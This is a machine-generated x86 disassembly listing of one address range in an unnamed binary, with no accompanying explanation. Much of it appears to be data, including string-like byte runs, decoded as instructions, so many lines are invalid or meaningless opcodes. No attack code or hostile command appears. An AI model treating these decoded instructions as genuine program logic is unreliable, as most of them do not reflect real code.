  4341a7:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4341ad:	add    BYTE PTR [eax],al
  4341af:	mov    eax,ecx
  4341b1:	loopne 0x434200
  4341b3:	add    BYTE PTR [ebx-0x757bcc39],cl
  4341b9:	dec    ecx
  4341ba:	or     eax,0x8b7232
  4341bf:	in     al,0xc1
  4341c1:	or     DWORD PTR [ebp-0x31],ecx
  4341c4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a49]
  4341cb:	xor    dh,BYTE PTR [edx-0x75]
  4341ce:	add    al,dh
  4341d0:	enter  0x4f09,0xcf
  4341d4:	inc    ebp
  4341d5:	mov    WORD PTR [ebx-0x75cdccb7],cs
  4341db:	or     al,BYTE PTR ds:0xe4728b
  4341e1:	or     DWORD PTR [ebp-0x31],ecx
  4341e4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4d]
  4341eb:	cmp    dh,BYTE PTR [edx+0xf]
  4341ee:	add    bl,dl
  4341f0:	rol    DWORD PTR [eax],0x4d
  4341f3:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  4341f9:	(bad)  
  4341fa:	or     eax,0x497284
  4341ff:	xor    al,cl
  434201:	mov    ecx,DWORD PTR [ebp-0x20]
  434204:	mov    ecx,DWORD PTR [ecx]
  434206:	xor    ecx,edi
  434208:	mov    cl,BYTE PTR [ebp+ecx*1+0x327249]
  43420f:	xor    cl,al
  434211:	mov    ecx,DWORD PTR [edi]
  434213:	fadd   QWORD PTR [ebp+0x9]
  434216:	call   0xffd03cea
  43421b:	dec    ecx
  43421c:	dec    ebp
  43421d:	xor    bh,BYTE PTR [ebx]
  43421f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  434223:	loopne 0x434221
  434225:	or     edi,eax
  434227:	iret   
  434228:	ret    
  434229:	mov    WORD PTR [ebp+0x4d],es
  43422c:	mov    esi,DWORD PTR [edx]
  43422e:	call   0x8453096d
  434233:	(bad)  
  434234:	cdq    
  434235:	add    BYTE PTR [edx],dh
  434237:	mov    esi,DWORD PTR [ebx]
  434239:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43423f:	test   BYTE PTR [ebx],dh
  434241:	dec    ecx
  434242:	add    esi,DWORD PTR [edx]
  434244:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  43424a:	dec    edi
  43424c:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d49]
  434253:	xor    al,BYTE PTR [ebx]
  434255:	mov    edi,DWORD PTR [ebx]
  434257:	in     al,0x75
  434259:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43425f:	dec    ecx
  434260:	xor    esi,DWORD PTR [edx]
  434262:	lea    ecx,[edx]
  434264:	or     BYTE PTR [ebx+0x900f072],cl
  43426a:	ja     0x43423b
  43426c:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b3],cl
  434273:	cmp    ch,al
  434275:	jne    0x43426a
  434277:	mov    edi,edi
  434279:	fadd   QWORD PTR [ebp+0x0]
  43427c:	mov    eax,edi
  43427e:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb7]
  434285:	mov    edx,DWORD PTR [ebx]
  434287:	in     al,0x45
  434289:	or     DWORD PTR [ebx],esi
  43428b:	iret   
  43428c:	add    ecx,DWORD PTR [eax+edx*2+0x45321849]
  434293:	xor    dl,BYTE PTR [eax-0x75]
  434296:	sbb    al,0xe0
  434298:	dec    DWORD PTR [ecx]
  43429a:	mov    ecx,edi
  43429c:	in     al,dx
  43429d:	mov    eax,es
  43429f:	dec    ecx
  4342a0:	mov    DWORD PTR [edx],esi
  4342a2:	fmul   QWORD PTR [edx]
  4342a4:	jne    0x434231
  4342a6:	(bad)  
  4342a7:	(bad)  
  4342a9:	or     DWORD PTR [ebp-0x31],eax
  4342ac:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b3]
  4342b3:	cmp    bh,bh
  4342b5:	jne    0x4342fc
  4342b7:	lea    ecx,[ebx-0x38372750]
  4342bd:	inc    ebx
  4342bf:	mov    eax,ecx
  4342c1:	mov    eax,0xa00c111
  4342c6:	jne    0x43430d
  4342c8:	mov    esi,DWORD PTR [ebx]
  4342ca:	test   al,0x3
  4342cc:	inc    ebp
  4342cd:	mov    DWORD PTR [eax-0xc],edx
  4342d0:	loop   0x434317
  4342d2:	push   DWORD PTR [ebx]
  4342d4:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4342da:	add    DWORD PTR [eax],eax
  4342dc:	mov    eax,edi
  4342de:	lods   al,BYTE PTR ds:[esi]
  4342df:	dec    ebp
  4342e0:	inc    ebp
  4342e1:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  4342e7:	retf   
  4342e8:	mov    edx,ecx
  4342ea:	adc    al,0x84
  4342ec:	(bad)  
  4342ed:	std    
  4342ee:	ret    
  4342ef:	jmp    FWORD PTR [edi-0x2b7474bb]
  4342f5:	hlt    
  4342f6:	rol    edi,0x82
  4342f9:	ret    
  4342fa:	cld    
  4342fb:	enter  0x11ff,0x45
  4342ff:	inc    ebp
  434300:	pop    edi
  434301:	mov    ebx,DWORD PTR [ebx+0x14]
  434304:	ret    0xc7
  434307:	test   BYTE PTR [ebx+0x45325199],cl
  43430d:	jmp    0x43429a
  43430f:	push   0x8
  434311:	call   DWORD PTR [esi]
  434313:	in     al,dx
  434314:	add    BYTE PTR [ebp+0x1],0x50
  434318:	add    bh,ah
  43431a:	add    bh,bh
  43431c:	icebp  
  43431d:	mov    ecx,DWORD PTR [eax]
  43431f:	cld    
  434320:	pop    es
  434321:	dec    ebp
  434322:	shl    DWORD PTR [ebx],0x72
  434325:	add    eax,DWORD PTR [eax]
  434327:	cmp    edx,ecx
  434329:	je     0x43433b
  43432b:	mov    esi,DWORD PTR [ebp-0x4]
  43432e:	inc    edi
  434330:	or     al,0xc3
  434332:	jmp    FWORD PTR [edx-0x18]
  434335:	(bad)  
  434336:	sti    
  434337:	cwde   
  434338:	(bad)  
  434339:	call   0xffa13c44
  43433e:	or     al,0x45
  434340:	push   ebp
  434341:	sub    esp,0x18
  434344:	push   ebx
  434345:	inc    ebp
  434346:	mov    edi,edi
  434348:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43434f:	test   al,0x51
  434351:	inc    ebp
  434352:	push   ecx
  434353:	push   eax
  434354:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  43435a:	add    ah,bh
  43435c:	(bad)  
  43435d:	dec    ebp
  43435e:	add    DWORD PTR [ebx],esi
  434360:	inc    ebp
  434361:	add    ecx,DWORD PTR [ebx+0x74943b]
  434367:	push   0xffffff8b
  434369:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43436f:	add    eax,DWORD PTR [ecx]
  434371:	or     BYTE PTR [eax],al
  434373:	call   0xff853b78
  434378:	mov    eax,DWORD PTR [ebp+0x14]
  43437b:	mov    ecx,DWORD PTR [ecx+0x801ac]
  434381:	inc    ebp
  434382:	dec    ecx
  434383:	add    ebp,DWORD PTR [edx+0x14]
  434386:	push   0x8b3045
  43438b:	call   0x33ad9100
  434390:	inc    DWORD PTR [ebx]
  434392:	mov    DWORD PTR [edi],ecx
  434394:	mov    eax,ecx
  434396:	or     BYTE PTR [ebp-0x3d],cl
  434399:	cmp    eax,edi
  43439b:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4343a0:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4343a6:	adc    al,0xc9
  4343a8:	inc    ebp
  4343a9:	adc    BYTE PTR [eax+0x55],dl
  4343ac:	jne    0x43439a
  4343ae:	call   0xff54433e
  4343b3:	dec    ebp
  4343b4:	inc    ebp
  4343b5:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4343bb:	add    BYTE PTR [ebx],bh
  4343bd:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4343c1:	push   ecx
  4343c2:	or     al,0x51
  4343c4:	dec    ebp
  4343c5:	xor    DWORD PTR [ebx],0xf320399
  4343cb:	cmp    eax,DWORD PTR [ebp+0x74]
  4343ce:	mov    edi,edi
  4343d0:	pop    edi
  4343d1:	adc    BYTE PTR [ebx+0x75],bl
  4343d4:	ret    0x50
  4343d7:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4343db:	(bad)  
  4343dc:	clc    
  4343dd:	mov    esp,ebp
  4343df:	pop    ecx
  4343e0:	mov    ecx,0xf80085c2
  4343e5:	mov    ecx,DWORD PTR [ecx+edx*2]
  4343e8:	push   esi
  4343e9:	push   esi
  4343ea:	(bad)  
  4343eb:	lock add eax,DWORD PTR [ebp+0x44]
  4343ef:	mov    edx,DWORD PTR [eax]
  4343f1:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  4343f5:	or     BYTE PTR [ecx+0x7],dl
  4343f8:	push   ecx
  4343f9:	ret    
  4343fa:	xor    ebx,DWORD PTR [ecx+0x37232be]
  434400:	add    BYTE PTR [ecx+0x147c8bfe],cl
  434406:	or     al,0x80
  434408:	jge    0x43440b
  43440a:	mov    DWORD PTR [eax],eax
  43440c:	and    al,0x8
  43440e:	cmp    DWORD PTR [ebp+0x10],eax
  434411:	mov    edx,DWORD PTR [esi]
  434413:	xchg   esp,eax
  434414:	dec    esp
  434415:	add    BYTE PTR [eax],dl
  434417:	mov    ecx,edx
  434419:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43441d:	dec    ebp
  43441e:	into   
  43441f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  434425:	mov    edx,DWORD PTR [eax+0x14]
  434428:	das    
  434429:	add    al,0x45
  43442b:	add    BYTE PTR [ebp+0x0],dh
  43442e:	mov    edi,edi
  434430:	and    al,0x50
  434432:	mov    eax,DWORD PTR [eax]
  434434:	and    al,0xd1
  434436:	xor    eax,DWORD PTR [esi]
  434438:	lea    eax,[ebp+0x8]
  43443b:	xor    esi,DWORD PTR [edx+0x3]
  43443e:	add    BYTE PTR [ecx+0x4510fc44],cl
  434444:	cmp    BYTE PTR [ebx+0x75eb0c9c],cl
  43444a:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  434454:	cmp    edi,edi
  434456:	pushf  
  434457:	mov    edi,edi
  434459:	or     BYTE PTR [esi+ecx*1],cl
  43445c:	jne    0x434421
  43445e:	call   0xc442a
  434463:	adc    BYTE PTR [ebp+eax*2+0xc],al
  434467:	mov    ebx,DWORD PTR [eax]
  434469:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  43446d:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  434475:	pop    esi
  434476:	(bad)  
  434477:	leave  
  434478:	call   DWORD PTR [eax]
  43447a:	call   DWORD PTR [ebp+0x24]
  43447d:	in     al,dx
  43447e:	jmp    esp
  434480:	and    al,0x83
  434482:	call   0xff7a4297
  434487:	pushf  
  434488:	inc    esp
  434489:	mov    DWORD PTR [esp],ecx
  43448c:	pop    esi
  43448d:	push   edi
  43448e:	in     eax,0x41
  434490:	ret    0x89
  434493:	and    al,0xe
  434495:	mov    edi,DWORD PTR [eax]
  434497:	and    al,0x75
  434499:	mov    edx,0x7750885
  43449e:	or     dl,bh
  4344a0:	call   FWORD PTR [ecx+0x3243224]
  4344a6:	or     BYTE PTR [ecx-0x74ebdbe8],cl
  4344ac:	dec    DWORD PTR [esp]
  4344af:	jl     0x43443c
  4344b1:	adc    al,0xc
  4344b3:	dec    ebp
  4344b4:	cmp    DWORD PTR [ebp+0x1c],esi
  4344b7:	mov    ecx,DWORD PTR [eax]
  4344b9:	and    al,0x10
  4344bb:	xor    eax,DWORD PTR [ebx+ecx*4+0x3242432]
  4344c2:	test   DWORD PTR [edi],ecx
  4344c4:	jge    0x434490
  4344c6:	push   0x8908ff4c
  4344cb:	jmp    0x4344f1
  4344cd:	adc    BYTE PTR [esp+eax*2-0x75],dh
  4344d1:	dec    esp
  4344d2:	pop    ebp
  4344d3:	ret    0x8999
  4344d6:	push   0x74f89cf8
  4344db:	jmp    0x434551
  4344dd:	mov    edi,0x104fd55f
  4344e2:	add    BYTE PTR [eax],dh
  4344e4:	adc    BYTE PTR ds:[eax],al
  4344e7:	or     edx,DWORD PTR gs:[eax]
  4344ea:	add    BYTE PTR [ecx],ch
  4344ec:	add    eax,0x35270010
  4344f1:	adc    BYTE PTR [eax],al
  4344f3:	std    
  4344f4:	dec    eax
  4344f5:	adc    BYTE PTR [eax],al
  4344f7:	(bad)  
  4344f8:	outs   dx,BYTE PTR ds:[esi]
  4344f9:	adc    BYTE PTR [eax],al
  4344fb:	sahf   
  4344fc:	xor    DWORD PTR [eax],edx
  4344fe:	add    BYTE PTR [esi+0x0],al
  434501:	adc    BYTE PTR [eax],al
  434503:	fs jae 0x434516
  434506:	add    BYTE PTR [ebx-0x20ffefac],bh
  43450c:	inc    esp
  43450d:	inc    ebx
  43450e:	add    bl,ah
  434510:	inc    esp
  434511:	inc    ebx
  434512:	add    bh,ah
  434514:	inc    esp
  434515:	inc    ebx
  434516:	add    bl,ch
  434518:	inc    esp
  434519:	inc    ebx
  43451a:	add    bh,ch
  43451c:	inc    esp
  43451d:	inc    ebx
  43451e:	add    bl,dh
  434520:	inc    esp
  434521:	inc    ebx
  434522:	add    bh,dh
  434524:	inc    esp
  434525:	inc    ebx
  434526:	add    bl,bh
  434528:	inc    esp
  434529:	inc    ebx
  43452a:	add    bh,bh
  43452c:	inc    esp
  43452d:	inc    ebx
  43452e:	add    BYTE PTR [ebx],al
  434530:	inc    ebp
  434531:	inc    ebx
  434532:	add    BYTE PTR [edi],al
  434534:	inc    ebp
  434535:	inc    ebx
  434536:	add    BYTE PTR [eax+ebp*1+0x47180010],dl
  43453d:	adc    BYTE PTR [eax],al
  43453f:	adc    dh,BYTE PTR [ecx+0x10]
  434542:	add    BYTE PTR [edi+0x2c001065],al
  434548:	push   0x5aa20010
  43454d:	adc    BYTE PTR [eax],al
  43454f:	rol    DWORD PTR [eax+edx*1],0x0
  434553:	int    0x6f
  434555:	adc    BYTE PTR [eax],al
  434557:	aaa    
  434558:	inc    ebp
  434559:	inc    ebx
  43455a:	add    BYTE PTR [ebx],bh
  43455c:	inc    ebp
  43455d:	inc    ebx
  43455e:	add    BYTE PTR [edi],bh
  434560:	inc    ebp
  434561:	inc    ebx
  434562:	add    BYTE PTR [ebx+0x45],al
  434565:	inc    ebx
  434566:	add    BYTE PTR [edi+0x45],al
  434569:	inc    ebx
  43456a:	add    BYTE PTR [ebx+0x45],cl
  43456d:	inc    ebx
  43456e:	add    BYTE PTR [edi+0x45],cl
  434571:	inc    ebx
  434572:	add    BYTE PTR [ebx+0x45],dl
  434575:	inc    ebx
  434576:	add    BYTE PTR [ebx+0x54001005],dh
  43457c:	push   ebp
  43457d:	adc    BYTE PTR [eax],al
  43457f:	sbb    bh,BYTE PTR [eax]
  434581:	adc    BYTE PTR [eax],al
  434583:	mov    edx,0x2f001013
  434588:	dec    edx
  434589:	adc    BYTE PTR [eax],al
  43458b:	inc    ecx
  43458c:	or     edx,DWORD PTR [eax]
  43458e:	add    BYTE PTR [ebx+0x19],ch
  434591:	adc    BYTE PTR [eax],al
  434593:	mov    esp,0x7700103e
  434598:	inc    ebp
  434599:	inc    ebx
  43459a:	add    BYTE PTR [ebx+0x45],bh
  43459d:	inc    ebx
  43459e:	add    BYTE PTR [edi+0x45],bh
  4345a1:	inc    ebx
  4345a2:	add    BYTE PTR [ebx-0x78ffbcbb],al
  4345a8:	inc    ebp
  4345a9:	inc    ebx
  4345aa:	add    BYTE PTR [ebx-0x70ffbcbb],cl
  4345b0:	inc    ebp
  4345b1:	inc    ebx
  4345b2:	add    BYTE PTR [ebx-0x50ffbcbb],dl
  4345b8:	push   0x10
  4345ba:	add    al,bl
  4345bc:	imul   edx,DWORD PTR [eax],0x0
  4345bf:	sahf   
  4345c0:	push   ss
  4345c1:	adc    BYTE PTR [eax],al
  4345c3:	jle    0x4345ff
  4345c5:	adc    BYTE PTR [eax],al
  4345c7:	jbe    0x4345de
  4345c9:	adc    BYTE PTR [eax],al
  4345cb:	cmp    DWORD PTR [edi+0x10],edx
  4345ce:	add    BYTE PTR [ebp+0x59001066],bl
  4345d4:	adc    al,0x10
  4345d6:	add    BYTE PTR [edi-0x44ffbcbb],dh
  4345dc:	inc    ebp
  4345dd:	inc    ebx
  4345de:	add    BYTE PTR [edi-0x3cffbcbb],bh
  4345e4:	inc    ebp
  4345e5:	inc    ebx
  4345e6:	add    bh,al
  4345e8:	inc    ebp
  4345e9:	inc    ebx
  4345ea:	add    bl,cl
  4345ec:	inc    ebp
  4345ed:	inc    ebx
  4345ee:	add    bh,cl
  4345f0:	inc    ebp
  4345f1:	inc    ebx
  4345f2:	add    bl,dl
  4345f4:	inc    ebp
  4345f5:	inc    ebx
  4345f6:	add    BYTE PTR [ebx-0x6affef90],bh
  4345fc:	inc    ebp
  4345fd:	adc    BYTE PTR [eax],al
  4345ff:	dec    ebx
  434600:	dec    eax
  434601:	adc    BYTE PTR [eax],al
  434603:	dec    ebx
  434604:	popa   
  434605:	adc    BYTE PTR [eax],al
  434607:	adc    al,BYTE PTR [eax+edx*1]
  43460a:	add    dh,dl
  43460c:	push   ds
  43460d:	adc    BYTE PTR [eax],al
  43460f:	hlt    
  434610:	pop    ds
  434611:	adc    BYTE PTR [eax],al
  434613:	dec    ecx
  434614:	pop    eax
  434615:	adc    BYTE PTR [eax],al
  434617:	test   DWORD PTR [ebp+0x43],0x4345fb00
  43461e:	add    bh,bh
  434620:	inc    ebp
  434621:	inc    ebx
  434622:	add    BYTE PTR [ebx],al
  434624:	inc    esi
  434625:	inc    ebx
  434626:	add    BYTE PTR [edi],al
  434628:	inc    esi
  434629:	inc    ebx
  43462a:	add    BYTE PTR [ebx],cl
  43462c:	inc    esi
  43462d:	inc    ebx
  43462e:	add    BYTE PTR [edi],cl
  434630:	inc    esi
  434631:	inc    ebx
  434632:	add    BYTE PTR [ebx],dl
  434634:	inc    esi
  434635:	inc    ebx
  434636:	add    BYTE PTR [ebp+0x57],cl
  434639:	xor    DWORD PTR [ecx],esi
  43463b:	cmp    BYTE PTR [edi+ebx*2],dh
  43463e:	push   ecx
  43463f:	add    BYTE PTR [edx+0x33],dl
  434642:	push   esi
  434643:	xor    eax,0x3849515f
  434648:	xor    al,0x59
  43464a:	push   edi
  43464b:	add    BYTE PTR [ebx+0x54],al
  43464e:	inc    ebp
  43464f:	pop    edi
  434650:	dec    ebx
  434651:	push   edx
  434652:	push   ebp
  434653:	add    BYTE PTR ss:[esp+eax*2+0x53],cl
  434658:	pop    edi
  434659:	aaa    
  43465a:	xor    al,0x32
  43465c:	xor    BYTE PTR [edi+0x5f],al
  43465f:	inc    ebx
  434660:	pop    edx
  434661:	add    BYTE PTR [edi+0x4e],al
  434664:	cmp    DWORD PTR [edi+0x47],ebx
  434667:	push   ebx
  434668:	cmp    DWORD PTR [edi+0x4e],edx
  43466b:	add    BYTE PTR [ecx+0x44],dl
  43466e:	cmp    BYTE PTR [edi+0x33],bl
  434671:	cmp    BYTE PTR [eax],dh
  434673:	pop    edi
  434674:	inc    ecx
  434675:	dec    edi
  434676:	inc    esi
  434677:	push   eax
  434678:	add    BYTE PTR [edx+0x43],dl
  43467b:	xor    eax,0x41305f30
  434680:	xor    BYTE PTR [esi+0x5f],al
  434683:	inc    ebx
  434684:	xor    dh,BYTE PTR [edx]
  434686:	xor    eax,0x36545200
  43468b:	xor    al,0x5f
  43468d:	dec    esi
  43468e:	xor    esi,DWORD PTR [edx]
  434690:	add    BYTE PTR ss:[eax+0x4b],cl
  434694:	inc    ebx
  434695:	pop    edi
  434696:	ss xor al,0x34
  434699:	pop    edi
  43469a:	inc    ecx
  43469b:	push   esp
  43469c:	dec    edi
  43469d:	add    BYTE PTR [esi+0x52],dl
  4346a0:	push   esi
  4346a1:	pop    edi
  4346a2:	inc    esi
  4346a3:	push   ecx
  4346a4:	push   ebp
  4346a5:	push   edx
  4346a6:	dec    eax
  4346a7:	add    BYTE PTR [esi+0x41],cl
  4346aa:	inc    edx
  4346ab:	pop    edi
  4346ac:	xor    DWORD PTR [ecx],edi
  4346ae:	push   edi
  4346af:	pop    edi
  4346b0:	pop    edx
  4346b1:	xor    eax,0x47003934
  4346b6:	push   edx
  4346b7:	push   ebp
  4346b8:	pop    edi
  4346b9:	xor    al,BYTE PTR [edx+0x30]
  4346bc:	push   ebx
  4346bd:	dec    esi
  4346be:	xor    eax,0x38564300
  4346c3:	xor    al,0x5f
  4346c5:	xor    bl,BYTE PTR [eax+0x36]
  4346c8:	inc    edx
  4346c9:	pop    edi
  4346ca:	pop    ecx
  4346cb:	xor    al,BYTE PTR [ecx+0x0]
  4346ce:	push   edi
  4346cf:	dec    ecx
  4346d0:	push   ebx
  4346d1:	xor    DWORD PTR [eax],edi
  4346d3:	pop    edi
  4346d4:	push   ecx
  4346d5:	xor    BYTE PTR [edx+0x5f],cl
  4346d8:	inc    ecx
  4346d9:	add    BYTE PTR ss:[edx+0x45],al
  4346dd:	push   edi
  4346de:	cmp    DWORD PTR [eax],edi
  4346e0:	pop    edi
  4346e1:	inc    edx
  4346e2:	xor    eax,0x36520057
  4346e7:	aaa    
  4346e8:	xor    BYTE PTR [edi],dh
  4346ea:	pop    edi
  4346eb:	inc    edx
  4346ec:	cmp    DWORD PTR [edi+0x52],eax
  4346ef:	dec    esp
  4346f0:	pop    edi
  4346f1:	dec    ebx
  4346f2:	add    BYTE PTR [esp+edx*2+0x30],al
  4346f6:	pop    edi
  4346f7:	push   ebp
  4346f8:	push   ebx
  4346f9:	aaa    
  4346fa:	dec    ebp
  4346fb:	pop    edi
  4346fc:	xor    ecx,DWORD PTR [edx+0x4e]
  4346ff:	dec    ebx
  434700:	dec    edx
  434701:	add    BYTE PTR [edi+0x47],al
  434704:	xor    eax,0x534e5f32
  434709:	push   esp
  43470a:	pop    edi
  43470b:	push   esp
  43470c:	inc    edx
  43470d:	inc    esi
  43470e:	inc    esp
  43470f:	add    BYTE PTR [ebp+0x4e],al
  434712:	inc    edi
  434713:	cmp    DWORD PTR [edi+0x57],ebx
  434716:	push   eax
  434717:	push   ecx
  434718:	pop    edi
  434719:	dec    edi
  43471a:	inc    ebx
  43471b:	push   edi
  43471c:	pop    edi
  43471d:	inc    edi
  43471e:	add    BYTE PTR [edi+0x45],dl
  434721:	inc    esi
  434722:	pop    edi
  434723:	push   edx
  434724:	inc    edx
  434725:	pop    eax
  434726:	inc    edi
  434727:	ss pop edi
  434729:	push   esi
  43472a:	inc    ebx
  43472b:	dec    esi
  43472c:	inc    esp
  43472d:	add    BYTE PTR [edi+0x4d],cl
  434730:	inc    edi
  434731:	xor    ebx,DWORD PTR [edi+0x34]
  434734:	dec    esi
  434735:	pop    edx
  434736:	cmp    BYTE PTR [edi+0x58],bl
  434739:	cmp    BYTE PTR [eax],al
  43473b:	push   edx
  43473c:	pop    eax
  43473d:	push   ecx
  43473e:	pop    edi
  43473f:	dec    esp
  434740:	push   edx
  434741:	dec    ecx
  434742:	dec    edi
  434743:	inc    esp
  434744:	pop    edi
  434745:	dec    edi
  434746:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  43474a:	push   eax
  43474b:	inc    ebp
  43474c:	pop    edi
  43474d:	xor    eax,0x565f3945
  434752:	add    BYTE PTR [edi+0x4e],al
  434755:	push   esi
  434756:	pop    edi
  434757:	inc    edi
  434758:	push   esp
  434759:	dec    eax
  43475a:	xor    dh,BYTE PTR [ecx]
  43475c:	pop    edi
  43475d:	dec    edi
  43475e:	xor    eax,DWORD PTR ss:[eax]
  434761:	inc    esp
  434762:	inc    ebp
  434763:	dec    ecx
  434764:	pop    edi
  434765:	push   edx
  434766:	dec    eax
  434767:	xor    al,0x48
  434769:	dec    ecx
  43476a:	ss pop edi
  43476c:	aaa    
  43476d:	aaa    
  43476e:	dec    ecx
  43476f:	dec    ebp
  434770:	add    BYTE PTR [eax+0x54],cl
  434773:	ss pop edi
  434775:	inc    esi
  434776:	inc    edx
  434777:	xor    dh,BYTE PTR [eax+eax*1]
  43477a:	dec    esi
  43477b:	ss dec edx
  43477d:	pop    edi
  43477e:	dec    ecx
  43477f:	dec    esp
  434780:	inc    edi
  434781:	inc    esp
  434782:	dec    eax
  434783:	xor    BYTE PTR [eax],bh
  434785:	xor    eax,0x34004f00
  43478a:	add    BYTE PTR [eax+eax*1+0x33],cl
  43478e:	add    BYTE PTR [edi],dh
  434790:	add    BYTE PTR [eax],dh
  434792:	add    BYTE PTR [edi+0x0],bl
  434795:	inc    esp
  434796:	add    BYTE PTR [edi+0x0],al
  434799:	dec    ebx
  43479a:	add    BYTE PTR [edx],dh
  43479c:	add    BYTE PTR [ecx+0x0],al
  43479f:	inc    ebx
  4347a0:	add    BYTE PTR [eax],al
  4347a2:	add    BYTE PTR [edi+0x0],cl
  4347a5:	xor    al,BYTE PTR [eax]
  4347a7:	xor    eax,DWORD PTR [eax]
  4347a9:	pop    edi
  4347aa:	add    BYTE PTR [edi+0x0],dl
  4347ad:	xor    al,BYTE PTR [eax]
  4347af:	dec    edi
  4347b0:	add    BYTE PTR [edi+0x0],bl
  4347b3:	pop    edx
  4347b4:	add    BYTE PTR [eax],al
  4347b6:	add    BYTE PTR [eax+0x0],bl
  4347b9:	dec    esp
  4347ba:	add    BYTE PTR [ecx],bh
  4347bc:	add    BYTE PTR [edi+0x0],bl
  4347bf:	dec    ebx
  4347c0:	add    BYTE PTR [ecx+0x0],al
  4347c3:	dec    edx
  4347c4:	add    BYTE PTR [esi+0x0],al
  4347c7:	xor    DWORD PTR [eax],eax
  4347c9:	xor    al,0x0
  4347cb:	pop    edi
  4347cc:	add    BYTE PTR [eax+0x0],bl
  4347cf:	inc    edi
  4347d0:	add    BYTE PTR [edx+0x0],al
  4347d3:	add    BYTE PTR [eax],al
  4347d5:	push   eax
  4347d6:	add    BYTE PTR [ebx],dh
  4347d8:	add    BYTE PTR [esi+0x0],cl
  4347db:	pop    edi
  4347dc:	add    BYTE PTR [eax+0x0],cl
  4347df:	xor    eax,0x5f005300
  4347e4:	add    BYTE PTR [eax+0x0],cl
  4347e7:	add    BYTE PTR [eax],al
  4347e9:	dec    ebp
  4347ea:	add    BYTE PTR [eax],dh
  4347ec:	add    BYTE PTR [edx+0x0],al
  4347ef:	pop    edi
  4347f0:	add    BYTE PTR [edx+0x0],cl
  4347f3:	pop    eax
  4347f4:	add    BYTE PTR [eax+eax*1+0x49],dl
  4347f8:	add    BYTE PTR [eax+eax*1+0x39],cl
  4347fc:	add    BYTE PTR [eax+eax*1+0x0],cl
  434800:	add    BYTE PTR [ecx+0x0],al
  434803:	xor    eax,DWORD PTR [eax]
  434805:	xor    BYTE PTR [eax],al
  434807:	pop    edi
  434808:	add    BYTE PTR [ecx+0x0],al
  43480b:	pop    edx
  43480c:	add    BYTE PTR [ecx+0x0],dl
  43480f:	pop    edx
  434810:	add    BYTE PTR [ecx],bh
  434812:	add    BYTE PTR [esi],dh
  434814:	add    BYTE PTR [edi+0x0],bl
  434817:	dec    eax
  434818:	add    BYTE PTR [eax+eax*1+0x5a],cl
  43481c:	add    BYTE PTR [eax],al
  43481e:	add    BYTE PTR [ecx+0x0],dl
  434821:	push   edi
  434822:	add    BYTE PTR [ecx+0x0],bl
  434825:	pop    edi
  434826:	add    BYTE PTR [esi+0x0],dl
  434829:	xor    al,0x0
  43482b:	inc    esp
  43482c:	add    BYTE PTR [ecx],dh
  43482e:	add    BYTE PTR [eax],bh
  434830:	add    BYTE PTR [edx],dh
  434832:	add    BYTE PTR [edi+0x0],bl
  434835:	cmp    DWORD PTR [eax],eax
  434837:	push   esp
  434838:	add    BYTE PTR [eax+eax*1+0x0],dl
  43483c:	add    BYTE PTR [esi+0x0],dl
  43483f:	dec    edi
  434840:	add    BYTE PTR [edi+0x0],al
  434843:	add    BYTE PTR ss:[edi+0x0],bl
  434847:	dec    edi
  434848:	add    BYTE PTR [edx+0x0],bl
  43484b:	inc    ebp
  43484c:	add    BYTE PTR [eax],dh
  43484e:	add    BYTE PTR [ebp+0x0],al
  434851:	xor    BYTE PTR [eax],al
  434853:	pop    edi
  434854:	add    BYTE PTR [eax],dh
  434856:	add    BYTE PTR ds:0x4f000000,dh
  43485c:	add    BYTE PTR ds:0x5f005700,dh
  434862:	add    BYTE PTR [edi],dh
  434864:	add    BYTE PTR [ebx+0x0],dl
  434867:	push   ebp
  434868:	add    BYTE PTR [edi+0x0],al
  43486b:	xor    al,0x0
  43486d:	pop    edi
  43486e:	add    BYTE PTR [ecx+0x0],dl
  434871:	inc    esp
  434872:	add    BYTE PTR [eax],al
  434874:	add    BYTE PTR [edx+0x0],dl
  434877:	push   esp
  434878:	add    BYTE PTR ds:0x52005f00,dh
  43487e:	add    BYTE PTR [edi+0x0],dl
  434881:	xor    al,BYTE PTR [eax]
  434883:	xor    al,BYTE PTR [eax]
  434885:	xor    BYTE PTR [eax],al
  434887:	xor    BYTE PTR [eax],al
  434889:	pop    edi
  43488a:	add    BYTE PTR [esi],dh
  43488c:	add    BYTE PTR [eax],al
  43488e:	add    BYTE PTR [eax+0x0],cl
  434891:	inc    ebp
  434892:	add    BYTE PTR [eax+eax*1+0x30],cl
  434896:	add    BYTE PTR [edi+0x0],bl
  434899:	dec    edx
  43489a:	add    BYTE PTR [edx],dh
  43489c:	add    BYTE PTR [edi],dh
  43489e:	add    BYTE PTR [ebp+0x0],dl
  4348a1:	add    BYTE PTR ss:[eax],dh
  4348a4:	add    BYTE PTR [eax],al
  4348a6:	add    BYTE PTR [esi+0x0],dl
  4348a9:	cmp    BYTE PTR [eax],al
  4348ab:	dec    edi
  4348ac:	add    BYTE PTR [ecx],bh
  4348ae:	add    BYTE PTR [edi+0x0],bl
  4348b1:	pop    eax
